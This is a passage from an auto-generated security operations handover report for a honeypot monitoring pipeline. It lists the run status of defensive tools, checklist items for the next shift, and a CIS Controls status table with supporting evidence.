| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (14.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 162 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-07T22:39:19Z_
